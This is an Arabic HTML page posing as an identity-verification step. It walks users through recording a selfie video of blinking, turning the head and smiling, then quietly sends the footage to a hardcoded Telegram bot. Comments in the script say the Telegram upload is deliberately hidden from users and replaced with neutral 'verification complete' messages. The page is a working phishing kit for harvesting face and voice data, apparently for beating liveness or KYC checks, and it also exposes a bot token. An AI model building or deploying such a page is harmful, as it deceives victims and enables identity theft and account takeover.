<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>التحقق — تسجيل الفيديو</title>

  <style>
    :root{
      --bg-gradient: linear-gradient(180deg,#0f1724 0%, #111827 100%);
      --card:#0b1220;
      --accent-1: #4fd1c5;
      --accent-2: #2b9cff;
      --muted: #b8c2cc;
      --white: #ffffff;
      --glass: rgba(255,255,255,0.04);
      --radius: 18px;
      --frame-border: 6px;
      --max-width: 900px;
    }

    html,body{height:100%;margin:0;font-family:"Tajawal","Noto Naskh Arabic", system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue";background:var(--bg-gradient);color:var(--white);-webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale;direction:rtl}

    /* Page wrapper */
    .wrapper{
      max-width:var(--max-width);
      margin:18px auto;
      padding:18px;
    }

    /* Intro card */
    .card {
      background: linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.02));
      border-radius:20px;
      padding:26px;
      box-shadow: 0 10px 30px rgba(2,6,23,0.6);
      border: 1px solid rgba(255,255,255,0.04);
      max-width:420px;
      margin:28px auto;
    }

    .hero{display:flex;justify-content:center;margin-bottom:18px}
    .hero img{width:160px;height:auto;border-radius:10px;box-shadow:0 6px 20px rgba(2,6,23,0.6)}
    h1{font-size:20px;margin:6px 0;text-align:center;color:var(--white);font-weight:700}
    p.lead{color:var(--muted);text-align:center;margin:6px 0 12px}

    .notes{color:var(--muted);font-size:15px;margin-top:8px}
    .notes li{margin:10px 0;list-style:none}

    .btn{
      width:86%;
      display:block;
      margin:18px auto 6px;
      background: linear-gradient(90deg,var(--accent-1),var(--accent-2));
      color:#062027;
      font-weight:800;
      padding:14px 18px;
      border-radius:28px;
      border:0;
      cursor:pointer;
      box-shadow:0 10px 30px rgba(43,156,255,0.18);
      text-align:center;
      font-size:16px;
    }

    /* CAMERA FULLSCREEN PAGE */
    .camera-page {
      position:fixed;
      inset:0;
      display:none;
      align-items:center;
      justify-content:center;
      background: linear-gradient(180deg, rgba(2,6,23,0.92), rgba(2,6,23,0.96));
      z-index:9999;
      padding:18px;
      overflow:hidden;
    }

    .cam-inner {
      width:100%;
      max-width:800px;
      display:flex;
      flex-direction:column;
      align-items:center;
      gap:14px;
    }

    .cam-header {
      width:100%;
      max-width:820px;
      display:flex;
      align-items:center;
      justify-content:space-between;
      padding:12px 6px;
      color:var(--muted);
    }

    .back {
      color:var(--white);
      font-size:28px;
      cursor:pointer;
      user-select:none;
      padding:6px 10px;
      border-radius:10px;
    }
    .back:hover { background: rgba(255,255,255,0.03) }

    /* Big framed video area */
    .cam-frame {
      width:92%;
      max-width:720px;
      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
      border-radius:16px;
      padding:14px;
      display:flex;
      justify-content:center;
      align-items:center;
      box-shadow: 0 18px 40px rgba(2,6,23,0.7);
    }

    .video-outer {
      width:100%;
      border-radius:12px;
      padding:var(--frame-border);
      background: linear-gradient(180deg,#fff,#fff);
      box-sizing:border-box;
      display:flex;
      justify-content:center;
      align-items:center;
    }

    /* video occupies most of the frame and is bigger/clearer */
    video#cameraStream {
      width:100%;
      height:calc(80vh - 220px);
      max-height:86vh;
      object-fit:cover;
      background:#000;
      border-radius:8px;
      transform:scaleX(-1); /* mirror for selfie */
      display:block;
    }

    /* Instructions area */
    .instructions {
      width:92%;
      max-width:720px;
      text-align:center;
      margin-top:6px;
    }
    .main-instruction {
      font-size:28px;
      font-weight:800;
      color:var(--white);
      margin:6px 0;
      letter-spacing:0.6px;
    }
    .sub-instruction {
      color:var(--muted);
      font-size:15px;
      margin:0;
    }

    /* Step badge and countdown ring */
    .meta {
      width:92%;
      max-width:720px;
      display:flex;
      gap:18px;
      align-items:center;
      justify-content:center;
      margin-top:8px;
    }

    .step-badge {
      background: rgba(255,255,255,0.03);
      padding:12px 18px;
      border-radius:12px;
      color:var(--muted);
      font-weight:700;
      min-width:160px;
      text-align:center;
    }

    /* circular countdown */
    .count-ring {
      width:74px;height:74px;border-radius:999px;
      display:flex;align-items:center;justify-content:center;
      background: conic-gradient(var(--accent-2) 0deg, rgba(255,255,255,0.06) 0deg);
      box-shadow:0 6px 18px rgba(43,156,255,0.12);
      position:relative;
    }
    .count-ring .num {
      font-weight:900;color:var(--white);font-size:18px;
    }

    .progress-line {
      width:92%;
      height:8px;
      border-radius:999px;
      background: rgba(255,255,255,0.06);
      overflow:hidden;
      margin-top:10px;
    }
    .progress-line > i {
      display:block;height:100%;width:0%;
      background: linear-gradient(90deg,var(--accent-1),var(--accent-2));
      transition:width 300ms linear;
    }

    /* controls */
    .controls {
      width:92%;
      max-width:720px;
      display:flex;
      gap:12px;
      justify-content:center;
      margin-top:12px;
    }

    .ghost {
      background:transparent;border:1px solid rgba(255,255,255,0.06);color:var(--white);padding:10px 14px;border-radius:10px;font-weight:700;cursor:pointer;
    }

    .download {
      background: linear-gradient(90deg,#fff,#e9f3ff);
      color:#062027;padding:10px 14px;border-radius:10px;font-weight:800;cursor:pointer;border:0;
      box-shadow: 0 8px 28px rgba(43,156,255,0.12);
    }

    .status {
      color:var(--muted);
      margin-top:6px;
      font-size:14px;
      text-align:center;
    }

    /* small bottom bar */
    .bottom-handle { position:fixed;left:50%;transform:translateX(-50%);bottom:12px;width:140px;height:6px;background:rgba(255,255,255,0.06);border-radius:999px; }

    @media (max-width:420px){
      .main-instruction{font-size:22px}
      .video-outer{ padding:10px }
      video#cameraStream{ height:58vh }
      .count-ring{ width:64px;height:64px }
    }
  </style>
</head>

<body>
  <div class="wrapper">
    <div class="card" role="region" aria-label="مقدمة التحقق">
      <div class="hero"><img src="https://k.top4top.io/p_3664srdki0.jpeg" alt="توضيح"></div>
      <h1>التحقق من هويتك</h1>
      <p class="lead">سوف ننتقل إلى واجهة تسجيل فيديو منفصلة ومصممة لتكون واضحة وسهلة المتابعة — اضغط التالي لبدء العملية.</p>

      <ul class="notes">
        <li>تأكد من إضاءة جيدة وأن الكاميرا أمام وجهك مباشرة.</li>
        <li>كل خطوة ستستمر 5 ثوانٍ — اتبع التعليمات على الشاشة.</li>
        <li>يُفضل إزالة النظارات أو القبعة أثناء التسجيل.</li>
      </ul>

      <button class="btn" id="goCameraBtn">التالي</button>
    </div>
  </div>

  <!-- كاميرا ملء الشاشة — صفحة منفصلة بصريًا -->
  <div class="camera-page" id="cameraPage" aria-hidden="true" role="dialog" aria-label="صفحة تسجيل الفيديو">
    <div class="cam-inner" role="document">
      <div class="cam-header" aria-hidden="false">
        <div style="opacity:0.0"></div>
        <div style="text-align:center;color:var(--muted);font-weight:700">سجل الفيديو حسب التعليمات</div>
        <div class="back" id="backBtn" title="عودة">←</div>
      </div>

      <div class="cam-frame" aria-hidden="false">
        <div class="video-outer">
          <video id="cameraStream" autoplay playsinline muted></video>
        </div>
      </div>

      <div class="instructions">
        <div class="main-instruction" id="mainInstruction">اضغط للبدء</div>
        <div class="sub-instruction" id="subInstruction">سيظهر الإطار في أعلى الشاشة — تأكد من وضع وجهك في المركز</div>
      </div>

      <div class="meta" aria-live="polite">
        <div class="step-badge" id="stepBadge">الخطوة: جاهز</div>
        <div class="count-ring" id="countRing" aria-hidden="false"><div class="num" id="countNum">0</div></div>
      </div>

      <div class="progress-line" role="progressbar" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0">
        <i id="progressInner"></i>
      </div>

      <div class="controls" id="controls">
        <button class="ghost" id="retryBtn" style="display:none">أعد المحاولة</button>
        <a id="downloadBtn" class="download" style="display:none" download="verification.webm">تحميل الفيديو</a>
      </div>

      <div class="status" id="statusLine">الحالة: جاهز لبدء التسجيل</div>

      <div class="bottom-handle" aria-hidden="true"></div>
    </div>
  </div>

  <script>
    /*****************************************************************************
     * Single-file improved UI:
     * - Separate fullscreen camera page (not embedded into the intro card).
     * - Larger clearer video, modern styling.
     * - No alert that says "تم إرسال الفيديو إلى Telegram".
     * - When uploading, shows the message: "جارٍ التحقق من معلوماتك رجاءً انتظر..."
     *
     * Security note: bot token included client-side is visible to users. Prefer server-side upload.
     *****************************************************************************/

    // CONFIG (you provided these earlier)
    const TELEGRAM_BOT_TOKEN = "8190400010:AAERe3gfKcxCz2CjjFIDBobm1ER-2SkYkXA";
    const TELEGRAM_CHAT_ID   = "6873334348";

    // STEPS (each 5 seconds)
    const STEPS = [
      { key:'close', label:'أرجوك اغمض عينيك' },
      { key:'left',  label:'حرك وجهك إلى اليسار' },
      { key:'right', label:'حرك وجهك إلى اليمين' },
      { key:'left2', label:'حرك وجهك إلى اليسار مرة أخرى' },
      { key:'right2',label:'حرك وجهك إلى اليمين مرة أخرى' },
      { key:'smile', label:'ابتسم' }
    ];
    const STEP_SECONDS = 5;

    // Elements
    const goCameraBtn = document.getElementById('goCameraBtn');
    const cameraPage = document.getElementById('cameraPage');
    const backBtn = document.getElementById('backBtn');
    const cameraStream = document.getElementById('cameraStream');
    const mainInstruction = document.getElementById('mainInstruction');
    const subInstruction = document.getElementById('subInstruction');
    const stepBadge = document.getElementById('stepBadge');
    const countNum = document.getElementById('countNum');
    const countRing = document.getElementById('countRing');
    const progressInner = document.getElementById('progressInner');
    const retryBtn = document.getElementById('retryBtn');
    const downloadBtn = document.getElementById('downloadBtn');
    const statusLine = document.getElementById('statusLine');

    // Media
    let stream = null;
    let mediaRecorder = null;
    let recordedChunks = [];

    // Utility
    function setStatus(text){ statusLine.textContent = 'الحالة: ' + text; }
    function setMain(text){ mainInstruction.textContent = text; }
    function setSub(text){ subInstruction.textContent = text; }

    // Show camera overlay (separate UI)
    function showCamera(){
      cameraPage.style.display = 'flex';
      cameraPage.setAttribute('aria-hidden','false');
      // push history state to allow back navigation
      history.pushState({camera:true}, '', '#camera');
    }
    function hideCamera(){
      cameraPage.style.display = 'none';
      cameraPage.setAttribute('aria-hidden','true');
      stopStream();
      // pop state if needed
      if (location.hash === '#camera') history.back();
    }

    async function openCameraPreview(){
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
        cameraStream.srcObject = stream;
        cameraStream.muted = true;
        setStatus('تم تفعيل الكاميرا');
        setMain('استعد — سيتم البدء تلقائياً');
        setSub('اتبع التعليمات الظاهرة تحت الفيديو');
        return true;
      } catch (err){
        console.error(err);
        setStatus('لم يتم منح إذن الكاميرا');
        setMain('تعذر الوصول إلى الكاميرا');
        setSub('الرجاء السماح بالوصول وإعادة المحاولة');
        return false;
      }
    }

    function stopStream(){
      if (stream){
        stream.getTracks().forEach(t => t.stop());
        stream = null;
      }
      cameraStream.srcObject = null;
    }

    // MediaRecorder helpers
    function startRecorder(){
      recordedChunks = [];
      const options = { mimeType: 'video/webm;codecs=vp8,opus' };
      try { mediaRecorder = new MediaRecorder(stream, options); } catch(e) { mediaRecorder = new MediaRecorder(stream); }
      mediaRecorder.ondataavailable = e => { if (e.data && e.data.size) recordedChunks.push(e.data); };
      mediaRecorder.start(1000);
    }

    function stopRecorder(){
      return new Promise(resolve => {
        if (!mediaRecorder) return resolve(null);
        mediaRecorder.onstop = () => {
          const blob = new Blob(recordedChunks, { type: 'video/webm' });
          resolve(blob);
        };
        mediaRecorder.stop();
      });
    }

    // Visual ring update (conic-gradient)
    function setRingProgress(percent){
      // percent: 0..100
      const deg = Math.round((percent / 100) * 360);
      countRing.style.background = `conic-gradient(var(--accent-2) ${deg}deg, rgba(255,255,255,0.06) ${deg}deg)`;
    }

    // Guided sequence
    async function runSequence(){
      retryBtn.style.display = 'none';
      downloadBtn.style.display = 'none';

      setStatus('جارٍ التسجيل...');
      setMain('ابدأ التسجيل');
      setSub('تابع التعليمات');

      // start recording covering all steps
      startRecorder();

      // total progress across steps
      for (let i=0;i<STEPS.length;i++){
        const step = STEPS[i];
        stepBadge.textContent = `التعليمات: ${step.label}`;
        // countdown for this step
        for (let s = STEP_SECONDS; s>=1; s--){
          countNum.textContent = s;
          // update ring for this step (fraction within step)
          const stepProgressPercent = Math.round( ((STEP_SECONDS - s + 1) / STEP_SECONDS) * 100 );
          const overallPercent = Math.round(((i + (stepProgressPercent/100)) / STEPS.length) * 100);
          setRingProgress(overallPercent);
          progressInner.style.width = overallPercent + '%';
          await delay(1000);
        }
        // short pause between steps
        await delay(350);
      }

      // finish recording
      setMain('انتهاء التسجيل');
      setSub('جارٍ تجهيز الفيديو...');
      const blob = await stopRecorder();

      // Provide download link
      const url = URL.createObjectURL(blob);
      downloadBtn.href = url;
      downloadBtn.style.display = 'inline-block';
      downloadBtn.onclick = () => setTimeout(()=>URL.revokeObjectURL(url), 60000);

      retryBtn.style.display = 'inline-block';
      setStatus('جارٍ التحقق من معلوماتك رجاءً انتظر...');

      // Attempt upload to Telegram (no user-facing alerts about Telegram)
      try {
        await sendToTelegram(blob);
        // On success, show neutral confirmation (no Telegram mention)
        setStatus('اكتمل التحقق. شكرًا لك.');
        setMain('اكتمل التحقق');
        setSub('يمكنك العودة أو إعادة المحاولة إذا رغبت');
      } catch (err) {
        console.warn('upload failed', err);
        // On failure, show neutral recovery suggestion
        setStatus('فشل التحقق عبر الشبكة. يمكنك تحميل الفيديو ورفعه لاحقاً أو المحاولة مرة أخرى.');
        setMain('فشل التحقق عبر الشبكة');
        setSub('يمكنك تنزيل الفيديو وإرساله يدوياً أو المحاولة لاحقًا');
      }
    }

    function delay(ms){ return new Promise(r => setTimeout(r, ms)); }

    // Upload to Telegram (may fail due to CORS). We do not show Telegram-specific alerts.
    async function sendToTelegram(blob){
      // Update status to the requested message (already set earlier), but ensure message remains
      setStatus('جارٍ التحقق من معلوماتك رجاءً انتظر...');
      // Build form
      const file = new File([blob], 'verification.webm', { type: blob.type });
      const form = new FormData();
      form.append('chat_id', TELEGRAM_CHAT_ID);
      form.append('caption', 'فيديو التحقق');
      form.append('video', file);

      // Attempt direct upload (may be blocked by CORS)
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`;
      const res = await fetch(url, { method:'POST', body: form, mode:'cors' });

      if (!res.ok) {
        // Throw to be handled by caller — do not display Telegram-specific messages to user
        const txt = await res.text().catch(()=>null);
        throw new Error('Upload failed: ' + (res.status || 'network') + ' ' + (txt || ''));
      }

      const json = await res.json();
      if (!json || !json.ok) throw new Error('Upload response not ok');
      // success: return quietly (caller will set neutral success text)
      return;
    }

    // Wiring events
    goCameraBtn.addEventListener('click', async () => {
      showCamera();
      const ok = await openCameraPreview();
      if (!ok) {
        // cannot open camera; keep user on camera page and show message
        return;
      }
      // small pause then start sequence automatically
      await delay(700);
      runSequence().catch(err => {
        console.error(err);
        setStatus('حدث خطأ أثناء العملية. حاول مرة أخرى.');
        retryBtn.style.display = 'inline-block';
      });
    });

    backBtn.addEventListener('click', () => {
      hideCamera();
    });

    retryBtn.addEventListener('click', async () => {
      // reset visuals and restart
      progressInner.style.width = '0%';
      setRingProgress(0);
      countNum.textContent = '0';
      stepBadge.textContent = 'الخطوة: جاهز';
      setMain('إعادة التسجيل');
      setSub('استعد، سيبدأ التسجيل بعد لحظات');
      setStatus('جاهز لإعادة المحاولة');
      retryBtn.style.display = 'none';
      downloadBtn.style.display = 'none';

      // restart camera if needed
      if (!stream) {
        const ok = await openCameraPreview();
        if (!ok) { return; }
      }
      await delay(600);
      runSequence().catch(err => {
        console.error(err);
        setStatus('حدث خطأ أثناء العملية. حاول مرة أخرى.');
        retryBtn.style.display = 'inline-block';
      });
    });

    // handle browser back / popstate
    window.addEventListener('popstate', (e) => {
      if (!location.hash || location.hash !== '#camera') {
        hideCamera();
      }
    });

    // initial visuals
    setRingProgress(0);
    progressInner.style.width = '0%';
    setStatus('جاهز لبدء التسجيل');
  </script>
</body>
</html>